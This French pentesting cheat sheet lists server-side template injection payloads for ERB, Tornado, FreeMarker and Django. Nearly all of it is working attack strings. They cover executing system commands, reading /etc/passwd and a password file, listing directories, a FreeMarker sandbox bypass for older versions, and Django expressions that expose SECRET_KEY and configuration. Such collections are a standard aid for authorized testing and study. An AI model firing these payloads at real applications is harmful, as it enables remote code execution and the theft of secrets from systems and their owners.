# SSTI

Pour détecter le template en provoquant une erreur, on peut utiliser la payload suivante : `${{<%[%'"}}%\`

## SSTI ERB (Embedded Ruby)

- [HackTricks SSTI ERB](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

### Syntaxe de Base
- `{{7*7}}` ou `${7*7}` : Syntaxe de base pour l'évaluation de l'expression `7*7`.
- `<%= 7*7 %>` : Affiche 49, utilise la syntaxe ERB pour évaluer `7*7`.

### Affichage d'Erreurs et de Variables
- `<%= foobar %>` : Génère une erreur si `foobar` n'est pas défini.

### Exécution de Commandes
- `<%= system("whoami") %>` : Exécute la commande `whoami`.

### Manipulation du Système de Fichiers
- `<%= Dir.entries('/') %>` : Liste les répertoires à la racine (`/`).
- `<%= File.open('/etc/passwd').read %>` : Lit le fichier `/etc/passwd`.

### Autres Méthodes d'Exécution de Commandes
- `<%= system('cat /etc/passwd') %>` : Exécute la commande `cat /etc/passwd`.
- `<%= `ls /` %>` : Utilise les backticks pour exécuter `ls /`.
- `<%= IO.popen('ls /').readlines() %>` : Utilise `IO.popen` pour exécuter `ls /`.

### Utilisation de Bibliothèques Externes
- `<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>` : Utilise la bibliothèque `Open3`.
- `<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>` : Utilise la bibliothèque `Open4`.

### Ressources Additionnelles
- [Plus d'informations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

## SSTI Tornado (Python)

- [HackTricks SSTI Tornado](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python)

### Syntaxe de Base
- `{{7*7}}` : Évalue l'expression `7*7` et retourne 49.
- `${7*7}` : Une autre syntaxe pour évaluer `7*7`.

### Manipulation de Chaînes
- `{{7*'7'}}` : Répète le caractère `'7'` sept fois, donnant `7777777`.

### Affichage d'Erreurs et de Variables
- `{{foobar}}` : Génère une erreur si `foobar` n'est pas défini.

### Import de Modules
- `{% import foobar %}` : Génère une erreur si le module `foobar` n'est pas trouvé.
- `{% import os %}` : Importe le module `os`.

### Exécution de Commandes
- `{{os.system('whoami')}}` : Tente d'exécuter la commande `whoami` en utilisant le module `os`.

### Ressources Additionnelles
- [Plus d'informations sur HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#tornado-python)

## SSTI FreeMarker Java

- [PortSwigger Research](https://portswigger.net/research/server-side-template-injection)
- [Plus d'informations](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)
- Tester les payloads : [Try FreeMarker](https://try.freemarker.apache.org)

### Syntaxe de Base
- `{{7*7}}` ou `${7*7}` : Évalue l'expression `7*7` et retourne 49.
- `#{7*7}` : Syntaxe obsolète pour évaluer `7*7`, retourne 49.
- `${7*'7'}` : Ne retourne rien dans FreeMarker.
- `${foobar}` : Affiche la valeur de `foobar` si défini.

### Exécution de Commandes
- `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
- `[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}`
- `${"freemarker.template.utility.Execute"?new()("id")}`

### Manipulation du Système de Fichiers
- `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`

### Contournement de la Sandbox
- ⚠️ Fonctionne uniquement sur les versions de FreeMarker antérieures à la 2.3.30
  
```freemarker
  <#assign classloader=article.class.protectionDomain.classLoader>
  <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
  <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
  <#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
  ${dwf.newInstance(ec,null)("id")}
```

## SSTI Django (Python)

- `{{settings}}`
- `{{settings.SECRET_KEY}}`
- `{{config}}`
- `{{config.items()}}`